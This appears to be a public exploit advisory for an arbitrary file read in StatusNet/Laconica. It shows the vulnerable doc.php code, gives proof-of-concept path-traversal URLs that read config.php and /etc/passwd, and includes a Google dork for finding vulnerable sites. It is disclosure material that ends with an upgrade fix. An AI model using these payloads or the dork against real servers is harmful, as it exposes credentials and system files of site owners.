@@ -1,0 +1,65 @@
++-------------------------------------------------------------------------------+
++ StatusNet/Laconica <= 0.7.4, <= 0.8.2, <= 0.9.0beta3 - arbitrary file reading +
++-------------------------------------------------------------------------------+
+
+# Date:
+	- 10/10/2013
+
+# Exploit Author:
+	- spiderboy
+
+# Vendor Homepage:
+	- http://status.net/
+
+# Software Links:
+	- http://status.net/laconica-0.7.4.tar.gz
+	- http://status.net/statusnet-0.8.2.tar.gz
+	- http://status.net/statusnet-0.9.0beta3.tar.gz
+
+# Version:
+	- Branch 0.7.X : <= 0.7.4
+	- Branch 0.8.X : <= 0.8.2
+	- Branch 0.9.X : <= 0.9.0beta3
+
+# Tested on:
+	- Unix/Linux
+
+# Category:
+	- Webapps
+
+# Platform:
+	- php
+
+# Advisories :
+	- http://status.net/wiki/Security_alert_0000002
+	- http://osvdb.org/show/osvdb/95586
+
+# Google Dork:
+	- "It runs the StatusNet microblogging software, version 0.8.2"
+
+# Vendor product description:
+	- Free and Open Source social software
+
+# Vulnerable code:
+	- actions/doc.php:
+	--------------------------------------------------------------------
+	function handle($args)
+	{
+		parent::handle($args);
+		$this->title    = $this->trimmed('title');
+		$this->filename = INSTALLDIR.'/doc-src/'.$this->title; //[1]
+		if (!file_exists($this->filename)) {
+			$this->clientError(_('No such document.'));
+			return;
+		}
+		$this->showPage();
+	}
+	--------------------------------------------------------------------
+	[1] : No check on user-supplied parameter $this->title
+
+# Proof of concept:
+	- http://[host]/index.php?action=doc&title=../config.php
+	- http://[host]/index.php?action=doc&title=../../../../../../../../etc/passwd
+
+# Solution:
+	- Upgrade to latest version : http://status.net/download
